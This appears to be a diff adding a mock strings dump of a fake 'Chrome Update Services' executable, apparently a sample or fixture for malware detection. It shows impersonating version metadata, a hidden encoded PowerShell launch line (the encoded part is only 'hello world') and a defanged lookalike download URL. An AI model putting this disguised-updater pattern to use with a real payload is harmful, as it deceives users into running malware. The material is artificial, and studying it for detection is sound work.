@@ -1,0 +1,14 @@
+
+MZ................This program cannot be run in DOS mode.
+...
+CompanyName: Chrome Update Services
+OriginalFilename: chrome_update.exe
+InternalName: chrome updater
+FileDescription: Update Chrome Fast
+FileVersion: 99.99.1.0
+
+...
+powershell -nop -w hidden -e aGVsbG8gd29ybGQ=
+...
+http://update-chrome-now[.]com/download
+...
